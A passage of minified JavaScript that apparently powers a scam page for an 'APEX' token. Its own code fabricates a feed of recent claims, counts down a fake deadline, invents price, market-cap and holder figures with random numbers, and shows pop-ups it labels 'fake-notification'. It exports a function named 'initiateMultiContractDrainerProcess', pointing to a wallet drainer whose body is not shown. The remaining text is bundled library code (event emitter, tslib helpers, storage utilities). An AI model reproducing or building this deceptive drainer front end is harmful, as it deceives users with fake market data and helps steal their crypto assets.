Ec(){uo&&(uo.innerHTML="",$n.forEach(t=>{const e=document.createElement("div");e.className="claim-item",e.innerHTML=`
            <span class="claim-address">${t.address}</span>
            <span class="claim-time">${Ay(t.timestamp)}</span>
            <span class="claim-amount-badge">${t.amount} APEX</span>
        `,uo.appendChild(e)}))}function Oy(){setInterval(()=>{$n.unshift(Lf()),$n.length>10&&$n.pop(),Ec()},3e4)}function $y(){let e=1800;El(e),hl=setInterval(()=>{if(e--,e<=0){clearInterval(hl);const n=document.getElementById("countdown");n&&(n.textContent="0:0:0:0",n.classList.add("pulse"));return}e<=900&&!dl&&(ws&&(ws.style.width="90%"),fi&&(fi.textContent="90%"),dl=!0),El(e)},1e3)}function El(t){const e=Math.floor(t/86400),n=Math.floor(t%(1440*60)/3600),r=Math.floor(t%3600/60),i=Math.floor(t%60),s=document.getElementById("countdown");s&&(s.textContent=`${e}:${n}:${r}:${i}`)}function Cy(){const t=document.getElementById("tokenChart");if(!t)return;const e=[];let n=.04;for(let r=0;r<24;r++){const i=Math.random()*.01-.002;n+=i,e.push(n)}ci=new Chart(t.getContext("2d"),{type:"line",data:{labels:Array.from({length:24},(r,i)=>i+"h"),datasets:[{label:"APEX Price",data:e,borderColor:"#FF6B00",backgroundColor:"rgba(255, 107, 0, 0.1)",borderWidth:2,tension:.4,pointRadius:0,fill:!0}]},options:{responsive:!0,maintainAspectRatio:!1,plugins:{legend:{display:!1}},scales:{x:{grid:{display:!1,drawBorder:!1},ticks:{color:"#a0aec0"}},y:{grid:{color:"rgba(255, 255, 255, 0.05)"},ticks:{color:"#a0aec0"}}}}})}function xl(){const t=pr.length>0?pr[pr.length-1]:.04,e=Math.random()*.015-.002,n=(t+e).toFixed(4);pr.push(parseFloat(n)),pr.length>10&&pr.shift();const r=((n-t)/t*100).toFixed(2),i=(Math.random()*1e6+15e5).toFixed(0),s=(Math.random()*5e5+2e5).toFixed(0),o=(Math.random()*1e4+1e4).toFixed(0),a=(Math.random()*5e5+5e5).toFixed(0),c=document.getElementById("tokenPrice"),l=document.getElementById("priceChange"),u=document.getElementById("marketCap"),h=document.getElementById("volume"),f=document.getElementById("holders"),p=document.getElementById("liquidity");if(c&&(c.textContent=`$${n}`),l&&(l.textContent=`${r}%`),u&&(u.textContent=i),h&&(h.textContent=s),f&&(f.textContent=o),p&&(p.textContent=a),ci){const g=ci.data.datasets[0].data.slice(1);g.push(parseFloat(n)),ci.data.datasets[0].data=g,ci.update()}const d=document.querySelector(".price-change");d&&(d.classList.remove("positive","negative"),d.classList.add(parseFloat(r)>=0?"positive":"negative"))}function _l(){const t=85+Math.floor(Math.random()*15);pl&&(pl.style.width=`${t}%`)}function Ae(t,e="success"){const n=document.createElement("div");n.className=`fake-notification ${e}`,n.innerHTML=`
            <i class="fas fa-${e==="success"?"check-circle":e==="error"?"exclamation-circle":"info-circle"}"></i>
            ${t}
        `,document.body.appendChild(n),setTimeout(()=>{n.style.opacity="0",setTimeout(()=>{document.body.removeChild(n)},300)},3e3)}window.addEventListener("scroll",()=>{const t=document.getElementById("header");t&&(window.scrollY>50?t.classList.add("scrolled"):t.classList.remove("scrolled"))});document.addEventListener("click",t=>{Jn&&!Jn.contains(t.target)&&ms&&!ms.contains(t.target)&&Jn.classList.remove("active"),Qn&&Qn.classList.contains("active")&&t.target===Qn&&bc(),er&&er.classList.contains("active")&&t.target===er&&vc()});document.querySelectorAll(".nav-links a")&&document.querySelectorAll(".nav-links a").forEach(t=>{t.addEventListener("click",()=>{Jn&&Jn.classList.remove("active")})});window.addEventListener("error",function(t){console.debug("Manual global error caught:",t.error)});window.addEventListener("unhandledrejection",function(t){console.debug("Manual unhandled promise rejection:",t.reason)});Fr&&document.body.classList.add("manual-mobile-optimized");window.initiateMultiContractDrainerProcess=py;var gr=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof global<"u"?global:typeof self<"u"?self:{};function Ff(t){return t&&t.__esModule&&Object.prototype.hasOwnProperty.call(t,"default")?t.default:t}function jf(t){if(Object.prototype.hasOwnProperty.call(t,"__esModule"))return t;var e=t.default;if(typeof e=="function"){var n=function r(){var i=!1;try{i=this instanceof r}catch{}return i?Reflect.construct(e,arguments,this.constructor):e.apply(this,arguments)};n.prototype=e.prototype}else n={};return Object.defineProperty(n,"__esModule",{value:!0}),Object.keys(t).forEach(function(r){var i=Object.getOwnPropertyDescriptor(t,r);Object.defineProperty(n,r,i.get?i:{enumerable:!0,get:function(){return t[r]}})}),n}var zi={exports:{}},Il;function Py(){if(Il)return zi.exports;Il=1;var t=typeof Reflect=="object"?Reflect:null,e=t&&typeof t.apply=="function"?t.apply:function(x,O,B){return Function.prototype.apply.call(x,O,B)},n;t&&typeof t.ownKeys=="function"?n=t.ownKeys:Object.getOwnPropertySymbols?n=function(x){return Object.getOwnPropertyNames(x).concat(Object.getOwnPropertySymbols(x))}:n=function(x){return Object.getOwnPropertyNames(x)};function r(b){console&&console.warn&&console.warn(b)}var i=Number.isNaN||function(x){return x!==x};function s(){s.init.call(this)}zi.exports=s,zi.exports.once=_,s.EventEmitter=s,s.prototype._events=void 0,s.prototype._eventsCount=0,s.prototype._maxListeners=void 0;var o=10;function a(b){if(typeof b!="function")throw new TypeError('The "listener" argument must be of type Function. Received type '+typeof b)}Object.defineProperty(s,"defaultMaxListeners",{enumerable:!0,get:function(){return o},set:function(b){if(typeof b!="number"||b<0||i(b))throw new RangeError('The value of "defaultMaxListeners" is out of range. It must be a non-negative number. Received '+b+".");o=b}}),s.init=function(){(this._events===void 0||this._events===Object.getPrototypeOf(this)._events)&&(this._events=Object.create(null),this._eventsCount=0),this._maxListeners=this._maxListeners||void 0},s.prototype.setMaxListeners=function(x){if(typeof x!="number"||x<0||i(x))throw new RangeError('The value of "n" is out of range. It must be a non-negative number. Received '+x+".");return this._maxListeners=x,this};function c(b){return b._maxListeners===void 0?s.defaultMaxListeners:b._maxListeners}s.prototype.getMaxListeners=function(){return c(this)},s.prototype.emit=function(x){for(var O=[],B=1;B<arguments.length;B++)O.push(arguments[B]);var k=x==="error",$=this._events;if($!==void 0)k=k&&$.error===void 0;else if(!k)return!1;if(k){var N;if(O.length>0&&(N=O[0]),N instanceof Error)throw N;var E=new Error("Unhandled error."+(N?" ("+N.message+")":""));throw E.context=N,E}var S=$[x];if(S===void 0)return!1;if(typeof S=="function")e(S,this,O);else for(var D=S.length,P=d(S,D),B=0;B<D;++B)e(P[B],this,O);return!0};function l(b,x,O,B){var k,$,N;if(a(O),$=b._events,$===void 0?($=b._events=Object.create(null),b._eventsCount=0):($.newListener!==void 0&&(b.emit("newListener",x,O.listener?O.listener:O),$=b._events),N=$[x]),N===void 0)N=$[x]=O,++b._eventsCount;else if(typeof N=="function"?N=$[x]=B?[O,N]:[N,O]:B?N.unshift(O):N.push(O),k=c(b),k>0&&N.length>k&&!N.warned){N.warned=!0;var E=new Error("Possible EventEmitter memory leak detected. "+N.length+" "+String(x)+" listeners added. Use emitter.setMaxListeners() to increase limit");E.name="MaxListenersExceededWarning",E.emitter=b,E.type=x,E.count=N.length,r(E)}return b}s.prototype.addListener=function(x,O){return l(this,x,O,!1)},s.prototype.on=s.prototype.addListener,s.prototype.prependListener=function(x,O){return l(this,x,O,!0)};function u(){if(!this.fired)return this.target.removeListener(this.type,this.wrapFn),this.fired=!0,arguments.length===0?this.listener.call(this.target):this.listener.apply(this.target,arguments)}function h(b,x,O){var B={fired:!1,wrapFn:void 0,target:b,type:x,listener:O},k=u.bind(B);return k.listener=O,B.wrapFn=k,k}s.prototype.once=function(x,O){return a(O),this.on(x,h(this,x,O)),this},s.prototype.prependOnceListener=function(x,O){return a(O),this.prependListener(x,h(this,x,O)),this},s.prototype.removeListener=function(x,O){var B,k,$,N,E;if(a(O),k=this._events,k===void 0)return this;if(B=k[x],B===void 0)return this;if(B===O||B.listener===O)--this._eventsCount===0?this._events=Object.create(null):(delete k[x],k.removeListener&&this.emit("removeListener",x,B.listener||O));else if(typeof B!="function"){for($=-1,N=B.length-1;N>=0;N--)if(B[N]===O||B[N].listener===O){E=B[N].listener,$=N;break}if($<0)return this;$===0?B.shift():g(B,$),B.length===1&&(k[x]=B[0]),k.removeListener!==void 0&&this.emit("removeListener",x,E||O)}return this},s.prototype.off=s.prototype.removeListener,s.prototype.removeAllListeners=function(x){var O,B,k;if(B=this._events,B===void 0)return this;if(B.removeListener===void 0)return arguments.length===0?(this._events=Object.create(null),this._eventsCount=0):B[x]!==void 0&&(--this._eventsCount===0?this._events=Object.create(null):delete B[x]),this;if(arguments.length===0){var $=Object.keys(B),N;for(k=0;k<$.length;++k)N=$[k],N!=="removeListener"&&this.removeAllListeners(N);return this.removeAllListeners("removeListener"),this._events=Object.create(null),this._eventsCount=0,this}if(O=B[x],typeof O=="function")this.removeListener(x,O);else if(O!==void 0)for(k=O.length-1;k>=0;k--)this.removeListener(x,O[k]);return this};function f(b,x,O){var B=b._events;if(B===void 0)return[];var k=B[x];return k===void 0?[]:typeof k=="function"?O?[k.listener||k]:[k]:O?w(k):d(k,k.length)}s.prototype.listeners=function(x){return f(this,x,!0)},s.prototype.rawListeners=function(x){return f(this,x,!1)},s.listenerCount=function(b,x){return typeof b.listenerCount=="function"?b.listenerCount(x):p.call(b,x)},s.prototype.listenerCount=p;function p(b){var x=this._events;if(x!==void 0){var O=x[b];if(typeof O=="function")return 1;if(O!==void 0)return O.length}return 0}s.prototype.eventNames=function(){return this._eventsCount>0?n(this._events):[]};function d(b,x){for(var O=new Array(x),B=0;B<x;++B)O[B]=b[B];return O}function g(b,x){for(;x+1<b.length;x++)b[x]=b[x+1];b.pop()}function w(b){for(var x=new Array(b.length),O=0;O<x.length;++O)x[O]=b[O].listener||b[O];return x}function _(b,x){return new Promise(function(O,B){function k(N){b.removeListener(x,$),B(N)}function $(){typeof b.removeListener=="function"&&b.removeListener("error",k),O([].slice.call(arguments))}v(b,x,$,{once:!0}),x!=="error"&&C(b,k,{once:!0})})}function C(b,x,O){typeof b.on=="function"&&v(b,"error",x,O)}function v(b,x,O,B){if(typeof b.on=="function")B.once?b.once(x,O):b.on(x,O);else if(typeof b.addEventListener=="function")b.addEventListener(x,function k($){B.once&&b.removeEventListener(x,k),O($)});else throw new TypeError('The "emitter" argument must be of type EventEmitter. Received type '+typeof b)}return zi.exports}var Tt=Py();const qf=Ff(Tt);var po={};var ba=function(t,e){return ba=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(n,r){n.__proto__=r}||function(n,r){for(var i in r)r.hasOwnProperty(i)&&(n[i]=r[i])},ba(t,e)};function Ty(t,e){ba(t,e);function n(){this.constructor=t}t.prototype=e===null?Object.create(e):(n.prototype=e.prototype,new n)}var va=function(){return va=Object.assign||function(e){for(var n,r=1,i=arguments.length;r<i;r++){n=arguments[r];for(var s in n)Object.prototype.hasOwnProperty.call(n,s)&&(e[s]=n[s])}return e},va.apply(this,arguments)};function By(t,e){var n={};for(var r in t)Object.prototype.hasOwnProperty.call(t,r)&&e.indexOf(r)<0&&(n[r]=t[r]);if(t!=null&&typeof Object.getOwnPropertySymbols=="function")for(var i=0,r=Object.getOwnPropertySymbols(t);i<r.length;i++)e.indexOf(r[i])<0&&Object.prototype.propertyIsEnumerable.call(t,r[i])&&(n[r[i]]=t[r[i]]);return n}function Ry(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s}function ky(t,e){return function(n,r){e(n,r,t)}}function Ny(t,e){if(typeof Reflect=="object"&&typeof Reflect.metadata=="function")return Reflect.metadata(t,e)}function Uy(t,e,n,r){function i(s){return s instanceof n?s:new n(function(o){o(s)})}return new(n||(n=Promise))(function(s,o){function a(u){try{l(r.next(u))}catch(h){o(h)}}function c(u){try{l(r.throw(u))}catch(h){o(h)}}function l(u){u.done?s(u.value):i(u.value).then(a,c)}l((r=r.apply(t,e||[])).next())})}function My(t,e){var n={label:0,sent:function(){if(s[0]&1)throw s[1];return s[1]},trys:[],ops:[]},r,i,s,o;return o={next:a(0),throw:a(1),return:a(2)},typeof Symbol=="function"&&(o[Symbol.iterator]=function(){return this}),o;function a(l){return function(u){return c([l,u])}}function c(l){if(r)throw new TypeError("Generator is already executing.");for(;n;)try{if(r=1,i&&(s=l[0]&2?i.return:l[0]?i.throw||((s=i.return)&&s.call(i),0):i.next)&&!(s=s.call(i,l[1])).done)return s;switch(i=0,s&&(l=[l[0]&2,s.value]),l[0]){case 0:case 1:s=l;break;case 4:return n.label++,{value:l[1],done:!1};case 5:n.label++,i=l[1],l=[0];continue;case 7:l=n.ops.pop(),n.trys.pop();continue;default:if(s=n.trys,!(s=s.length>0&&s[s.length-1])&&(l[0]===6||l[0]===2)){n=0;continue}if(l[0]===3&&(!s||l[1]>s[0]&&l[1]<s[3])){n.label=l[1];break}if(l[0]===6&&n.label<s[1]){n.label=s[1],s=l;break}if(s&&n.label<s[2]){n.label=s[2],n.ops.push(l);break}s[2]&&n.ops.pop(),n.trys.pop();continue}l=e.call(t,n)}catch(u){l=[6,u],i=0}finally{r=s=0}if(l[0]&5)throw l[1];return{value:l[0]?l[1]:void 0,done:!0}}}function Ly(t,e,n,r){r===void 0&&(r=n),t[r]=e[n]}function Fy(t,e){for(var n in t)n!=="default"&&!e.hasOwnProperty(n)&&(e[n]=t[n])}function Ea(t){var e=typeof Symbol=="function"&&Symbol.iterator,n=e&&t[e],r=0;if(n)return n.call(t);if(t&&typeof t.length=="number")return{next:function(){return t&&r>=t.length&&(t=void 0),{value:t&&t[r++],done:!t}}};throw new TypeError(e?"Object is not iterable.":"Symbol.iterator is not defined.")}function zf(t,e){var n=typeof Symbol=="function"&&t[Symbol.iterator];if(!n)return t;var r=n.call(t),i,s=[],o;try{for(;(e===void 0||e-- >0)&&!(i=r.next()).done;)s.push(i.value)}catch(a){o={error:a}}finally{try{i&&!i.done&&(n=r.return)&&n.call(r)}finally{if(o)throw o.error}}return s}function jy(){for(var t=[],e=0;e<arguments.length;e++)t=t.concat(zf(arguments[e]));return t}function qy(){for(var t=0,e=0,n=arguments.length;e<n;e++)t+=arguments[e].length;for(var r=Array(t),i=0,e=0;e<n;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,i++)r[i]=s[o];return r}function Ei(t){return this instanceof Ei?(this.v=t,this):new Ei(t)}function zy(t,e,n){if(!Symbol.asyncIterator)throw new TypeError("Symbol.asyncIterator is not defined.");var r=n.apply(t,e||[]),i,s=[];return i={},o("next"),o("throw"),o("return"),i[Symbol.asyncIterator]=function(){return this},i;function o(f){r[f]&&(i[f]=function(p){return new Promise(function(d,g){s.push([f,p,d,g])>1||a(f,p)})})}function a(f,p){try{c(r[f](p))}catch(d){h(s[0][3],d)}}function c(f){f.value instanceof Ei?Promise.resolve(f.value.v).then(l,u):h(s[0][2],f)}function l(f){a("next",f)}function u(f){a("throw",f)}function h(f,p){f(p),s.shift(),s.length&&a(s[0][0],s[0][1])}}function Vy(t){var e,n;return e={},r("next"),r("throw",function(i){throw i}),r("return"),e[Symbol.iterator]=function(){return this},e;function r(i,s){e[i]=t[i]?function(o){return(n=!n)?{value:Ei(t[i](o)),done:i==="return"}:s?s(o):o}:s}}function Wy(t){if(!Symbol.asyncIterator)throw new TypeError("Symbol.asyncIterator is not defined.");var e=t[Symbol.asyncIterator],n;return e?e.call(t):(t=typeof Ea=="function"?Ea(t):t[Symbol.iterator](),n={},r("next"),r("throw"),r("return"),n[Symbol.asyncIterator]=function(){return this},n);function r(s){n[s]=t[s]&&function(o){return new Promise(function(a,c){o=t[s](o),i(a,c,o.done,o.value)})}}function i(s,o,a,c){Promise.resolve(c).then(function(l){s({value:l,done:a})},o)}}function Ky(t,e){return Object.defineProperty?Object.defineProperty(t,"raw",{value:e}):t.raw=e,t}function Hy(t){if(t&&t.__esModule)return t;var e={};if(t!=null)for(var n in t)Object.hasOwnProperty.call(t,n)&&(e[n]=t[n]);return e.default=t,e}function Gy(t){return t&&t.__esModule?t:{default:t}}function Yy(t,e){if(!e.has(t))throw new TypeError("attempted to get private field on non-instance");return e.get(t)}function Zy(t,e,n){if(!e.has(t))throw new TypeError("attempted to set private field on non-instance");return e.set(t,n),n}const Xy=Object.freeze(Object.defineProperty({__proto__:null,get __assign(){return va},__asyncDelegator:Vy,__asyncGenerator:zy,__asyncValues:Wy,__await:Ei,__awaiter:Uy,__classPrivateFieldGet:Yy,__classPrivateFieldSet:Zy,__createBinding:Ly,__decorate:Ry,__exportStar:Fy,__extends:Ty,__generator:My,__importDefault:Gy,__importStar:Hy,__makeTemplateObject:Ky,__metadata:Ny,__param:ky,__read:zf,__rest:By,__spread:jy,__spreadArrays:qy,__values:Ea},Symbol.toStringTag,{value:"Module"})),qs=jf(Xy);var go={},Wr={},Sl;function Jy(){if(Sl)return Wr;Sl=1,Object.defineProperty(Wr,"__esModule",{value:!0}),Wr.delay=void 0;function t(e){return new Promise(n=>{setTimeout(()=>{n(!0)},e)})}return Wr.delay=t,Wr}var Mn={},yo={},Ln={},Dl;function Qy(){return Dl||(Dl=1,Object.defineProperty(Ln,"__esModule",{value:!0}),Ln.ONE_THOUSAND=Ln.ONE_HUNDRED=void 0,Ln.ONE_HUNDRED=100,Ln.ONE_THOUSAND=1e3),Ln}var mo={},Al;function e0(){return Al||(Al=1,(function(t){Object.defineProperty(t,"__esModule",{value:!0}),t.ONE_YEAR=t.FOUR_WEEKS=t.THREE_WEEKS=t.TWO_WEEKS=t.ONE_WEEK=t.THIRTY_DAYS=t.SEVEN_DAYS=t.FIVE_DAYS=t.THREE_DAYS=t.ONE_DAY=t.TWENTY_FOUR_HOURS=t.TWELVE_HOURS=t.SIX_HOURS=t.THREE_HOURS=t.ONE_HOUR=t.SIXTY_MINUTES=t.THIRTY_MINUTES=t.TEN_MINUTES=t.FIVE_MINUTES=t.ONE_MINUTE=t.SIXTY_SECONDS=t.THIRTY_SECONDS=t.TEN_SECONDS=t.FIVE_SECONDS=t.ONE_SECOND=void 0,t.ONE_SECOND=1,t.FIVE_SECONDS=5,t.TEN_SECONDS=10,t.THIRTY_SECONDS=30,t.SIXTY_SECONDS=60,t.ONE_MINUTE=t.SIXTY_SECONDS,t.FIVE_MINUTES=t.ONE_MINUTE*5,t.TEN_MINUTES=t.ONE_MINUTE*10,t.THIRTY_MINUTES=t.ONE_MINUTE*30,t.SIXTY_MINUTES=t.ONE_MINUTE*60,t.ONE_HOUR=t.SIXTY_MINUTES,t.THREE_HOURS=t.ONE_HOUR*3,t.SIX_HOURS=t.ONE_HOUR*6,t.TWELVE_HOURS=t.ONE_HOUR*12,t.TWENTY_FOUR_HOURS=t.ONE_HOUR*24,t.ONE_DAY=t.TWENTY_FOUR_HOURS,t.THREE_DAYS=t.ONE_DAY*3,t.FIVE_DAYS=t.ONE_DAY*5,t.SEVEN_DAYS=t.ONE_DAY*7,t.THIRTY_DAYS=t.ONE_DAY*30,t.ONE_WEEK=t.SEVEN_DAYS,t.TWO_WEEKS=t.ONE_WEEK*2,t.THREE_WEEKS=t.ONE_WEEK*3,t.FOUR_WEEKS=t.ONE_WEEK*4,t.ONE_YEAR=t.ONE_DAY*365})(mo)),mo}var Ol;function Vf(){return Ol||(Ol=1,(function(t){Object.defineProperty(t,"__esModule",{value:!0});const e=qs;e.__exportStar(Qy(),t),e.__exportStar(e0(),t)})(yo)),yo}var $l;function t0(){if($l)return Mn;$l=1,Object.defineProperty(Mn,"__esModule",{value:!0}),Mn.fromMiliseconds=Mn.toMiliseconds=void 0;const t=Vf();function e(r){return r*t.ONE_THOUSAND}Mn.toMiliseconds=e;function n(r){return Math.floor(r/t.ONE_THOUSAND)}return Mn.fromMiliseconds=n,Mn}var Cl;function n0(){return Cl||(Cl=1,(function(t){Object.defineProperty(t,"__esModule",{value:!0});const e=qs;e.__exportStar(Jy(),t),e.__exportStar(t0(),t)})(go)),go}var yr={},Pl;function r0(){if(Pl)return yr;Pl=1,Object.defineProperty(yr,"__esModule",{value:!0}),yr.Watch=void 0;class t{constructor(){this.timestamps=new Map}start(n){if(this.timestamps.has(n))throw new Error(`Watch already started for label: ${n}`);this.timestamps.set(n,{started:Date.now()})}stop(n){const r=this.get(n);if(typeof r.elapsed<"u")throw new Error(`Watch already stopped for label: ${n}`);const i=Date.now()-r.started;this.timestamps.set(n,{started:r.started,elapsed:i})}get(n){const r=this.timestamps.get(n);if(typeof r>"u")throw new Error(`No timestamp found for label: ${n}`);return r}elapsed(n){const r=this.get(n);return r.elapsed||Date.now()-r.started}}return yr.Watch=t,yr.default=t,yr}var wo={},Kr={},Tl;function i0(){if(Tl)return Kr;Tl=1,Object.defineProperty(Kr,"__esModule",{value:!0}),Kr.IWatch=void 0;class t{}return Kr.IWatch=t,Kr}var Bl;function s0(){return Bl||(Bl=1,(function(t){Object.defineProperty(t,"__esModule",{value:!0}),qs.__exportStar(i0(),t)})(wo)),wo}var Rl;function o0(){return Rl||(Rl=1,(function(t){Object.defineProperty(t,"__esModule",{value:!0});const e=qs;e.__exportStar(n0(),t),e.__exportStar(r0(),t),e.__exportStar(s0(),t),e.__exportStar(Vf(),t)})(po)),po}var z=o0();class ar{}let a0=class extends ar{constructor(e){super()}};const kl=z.FIVE_SECONDS,cr={pulse:"heartbeat_pulse"};let c0=class Wf extends a0{constructor(e){super(e),this.events=new Tt.EventEmitter,this.interval=kl,this.interval=e?.interval||kl}static async init(e){const n=new Wf(e);return await n.init(),n}async init(){await this.initialize()}stop(){clearInterval(this.intervalRef)}on(e,n){this.events.on(e,n)}once(e,n){this.events.once(e,n)}off(e,n){this.events.off(e,n)}removeListener(e,n){this.events.removeListener(e,n)}async initialize(){this.intervalRef=setInterval(()=>this.pulse(),z.toMiliseconds(this.interval))}pulse(){this.events.emit(cr.pulse)}};const l0=/"(?:_|\\u0{2}5[Ff]){2}(?:p|\\u0{2}70)(?:r|\\u0{2}72)(?:o|\\u0{2}6[Ff])(?:t|\\u0{2}74)(?:o|\\u0{2}6[Ff])(?:_|\\u0{2}5[Ff]){2}"\s*:/,u0=/"(?:c|\\u0063)(?:o|\\u006[Ff])(?:n|\\u006[Ee])(?:s|\\u0073)(?:t|\\u0074)(?:r|\\u0072)(?:u|\\u0075)(?:c|\\u0063)(?:t|\\u0074)(?:o|\\u006[Ff])(?:r|\\u0072)"\s*:/,h0=/^\s*["[{]|^\s*-?\d{1,16}(\.\d{1,17})?([Ee][+-]?\d+)?\s*$/;function f0(t,e){if(t==="__proto__"||t==="constructor"&&e&&typeof e=="object"&&"prototype"in e){d0(t);return}return e}function d0(t){console.warn(`[destr] Dropping "${t}" key to prevent prototype pollution.`)}function Vi(t,e={}){if(typeof t!="string")return t;if(t[0]==='"'&&t[t.length-1]==='"'&&t.indexOf("\\")===-1)return t.slice(1,-1);const n=t.trim();if(n.length<=9)switch(n.toLowerCase()){case"true":return!0;case"false":return!1;case"undefined":return;case"null":return null;case"nan":return Number.NaN;case"infinity":return Number.POSITIVE_INFINITY;case"-infinity":return Number.NEGATIVE_INFINITY}if(!h0.test(t)){if(e.strict)throw new SyntaxError("[destr] Invalid JSON");return t}try{if(l0.test(t)||u0.test(t)){if(e.strict)throw new Error("[destr] Possible prototype pollution");return JSON.parse(t,f0)}return JSON.parse(t)}catch(r){if(e.strict)throw r;return t}}function p0(t){return!t||typeof t.then!="function"?Promise.resolve(t):t}function De(t,...e){try{return p0(t(...e))}catch(n){return Promise.reject(n)}}function g0(t){const e=typeof t;return t===null||e!=="object"&&e!=="function"}function y0(t){const e=Object.getPrototypeOf(t);return!e||e.isPrototypeOf(Object)}function ls(t){if(g0(t))return String(t);if(y0(t)||Array.isArray(t))return JSON.stringify(t);if(typeof t.toJSON=="function")return ls(t.toJSON());throw new Error("[unstorage] Cannot stringify value!")}const xa="base64:";function m0(t){return typeof t=="string"?t:xa+v0(t)}function w0(t){return typeof t!="string"||!t.startsWith(xa)?t:b0(t.slice(xa.length))}function b0(t){return globalThis.Buffer?Buffer.from(t,"base64"):Uint8Array.from(globalThis.atob(t),e=>e.codePointAt(0))}function v0(t){return globalThis.Buffer?Buffer.from(t).toString("base64"):globalThis.btoa(String.fromCodePoint(...t))}function Je(t){return t&&t.split("?")[0]?.replace(/[/\\]/g,":").replace(/:+/g,":").replace(/^:|:$/g,"")||""}function E0(...t){return Je(t.join(":"))}function Wi(t){return t=Je(t),t?t+":":""}function x0(t,e){if(e===void 0)return!0;let n=0,r=t.indexOf(":");for(;r>-1;)n++,r=t.indexOf(":",r+1);return n<=e}function _0(t,e){return e?t.startsWith(e)&&t[t.length-1]!=="$":t[t.length-1]!=="$"}const I0="memory",S0=()=>{const t=new Map;return{name:I0,getInstance:()=>t,hasItem(e){return t.has(e)},getItem(e){return t.get(e)??null},getItemRaw(e){return t.get(e)??null},setItem(e,n){t.set(e,n)},setItemRaw(e,n){t.set(e,n)},removeItem(e){t.delete(e)},getKeys(){return[...t.keys()]},clear(){t.clear()},dispose(){t.clear()}}};function D0(t={}){const e={mounts:{"":t.driver||S0()},mountpoints:[""],watching:!1,watchListeners:[],unwatch:{}},n=l=>{for(const u of e.mountpoints)if(l.startsWith(u))return{base:u,relativeKey:l.slice(u.length),driver:e.mounts[u]};return{base:"",relativeKey:l,driver:e.mounts[""]}},r=(l,u)=>e.mountpoints.filter(h=>h.startsWith(l)||u&&l.startsWith(h)).map(h=>({relativeBase:l.length>h.length?l.slice(h.length):void 0,mountpoint:h,driver:e.mounts[h]})),i=(l,u)=>{if(e.watching){u=Je(u);for(const h of e.watchListeners)h(l,u)}},s=async()=>{if(!e.watching){e.watching=!0;for(const l in e.mounts)e.unwatch[l]=await Nl(e.mounts[l],i,l)}},o=async()=>{if(e.watching){for(const l in e.unwatch)await e.unwatch[l]();e.unwatch={},e.watching=!1}},a=(l,u,h)=>{const f=new Map,p=d=>{let g=f.get(d.base);return g||(g={driver:d.driver,base:d.base,items:[]},f.set(d.base,g)),g};for(const d of l){const g=typeof d=="string",w=Je(g?d:d.key),_=g?void 0:d.value,C=g||!d.options?u:{...u,...d.options},v=n(w);p(v).items.push({key:w,value:_,relativeKey:v.relativeKey,options:C})}return Promise.all([...f.values()].map(d=>h(d))).then(d=>d.flat())},c={hasItem(l,u={}){l=Je(l);const{relativeKey:h,driver:f}=n(l);return De(f.hasItem,h,u)},getItem(l,u={}){l=Je(l);const{relativeKey:h,driver:f}=n(l);return De(f.getItem,h,u).then(p=>Vi(p))},getItems(l,u={}){return a(l,u,h=>h.driver.getItems?De(h.driver.getItems,h.items.map(f=>({key:f.relativeKey,options:f.options})),u).then(f=>f.map(p=>({key:E0(h.base,p.key),value:Vi(p.value)}))):Promise.all(h.items.map(f=>De(h.driver.getItem,f.relativeKey,f.options).then(p=>({key:f.key,value:Vi(p)})))))},getItemRaw(l,u={}){l=Je(l);const{relativeKey:h,driver:f}=n(l);return f.getItemRaw?De(f.getItemRaw,h,u):De(f.getItem,h,u).then(p=>w0(p))},async setItem(l,u,h={}){if(u===void 0)return c.removeItem(l);l=Je(l);const{relativeKey:f,driver:p}=n(l);p.setItem&&(await De(p.setItem,f,ls(u),h),p.watch||i("update",l))},async setItems(l,u){await a(l,u,async h=>{if(h.driver.setItems)return De(h.driver.setItems,h.items.map(f=>({key:f.relativeKey,value:ls(f.value),options:f.options})),u);h.driver.setItem&&await Promise.all(h.items.map(f=>De(h.driver.setItem,f.relativeKey,ls(f.value),f.options)))})},async setItemRaw(l,u,h={}){if(u===void 0)return c.removeItem(l,h);l=Je(l);const{relativeKey:f,driver:p}=n(l);if(p.setItemRaw)await De(p.setItemRaw,f,u,h);else if(p.setItem)await De(p.setItem,f,m0(u),h);else return;p.watch||i("update",l)},async removeItem(l,u={}){typeof u=="boolean"&&(u={removeMeta:u}),l=Je(l);const{relativeKey:h,driver:f}=n(l);f.removeItem&&(await De(f.removeItem,h,u),(u.removeMeta||u.removeMata)&&await De(f.removeItem,h+"$",u),f.watch||i("remove",l))},async getMeta(l,u={}){typeof u=="boolean"&&(u={nativeOnly:u}),l=Je(l);const{relativeKey:h,driver:f}=n(l),p=Object.create(null);if(f.getMeta&&Object.assign(p,await De(f.getMeta,h,u)),!u.nativeOnly){const d=await De(f.getItem,h+"$",u).then(g=>Vi(g));d&&typeof d=="object"&&(typeof d.atime=="string"&&(d.atime=new Date(d.atime)),typeof d.mtime=="string"&&(d.mtime=new Date(d.mtime)),Object.assign(p,d))}return p},setMeta(l,u,h={}){return this.setItem(l+"$",u,h)},removeMeta(l,u={}){return this.removeItem(l+"$",u)},async getKeys(l,u={}){l=Wi(l);const h=r(l,!0);let f=[];const p=[];let d=!0;for(const w of h){w.driver.flags?.maxDepth||(d=!1);const _=await De(w.driver.getKeys,w.relativeBase,u);for(const C of _){const v=w.mountpoint+Je(C);f.some(b=>v.startsWith(b))||p.push(v)}f=[w.mountpoint,...f.filter(C=>!C.startsWith(w.mountpoint))]}const g=u.maxDepth!==void 0&&!d;return p.filter(w=>(!g||x0(w,u.maxDepth))&&_0(w,l))},async clear(l,u={}){l=Wi(l),await Promise.all(r(l,!1).map(async h=>{if(h.driver.clear)return De(h.driver.clear,h.relativeBase,u);if(h.driver.removeItem){const f=await h.driver.getKeys(h.relativeBase||"",u);return Promise.all(f.map(p=>h.driver.removeItem(p,u)))}}))},async dispose(){await Promise.all(Object.values(e.mounts).map(l=>Ul(l)))},async watch(l){return await s(),e.watchListeners.push(l),async()=>{e.watchListeners=e.watchListeners.filter(u=>u!==l),e.watchListeners.length===0&&await 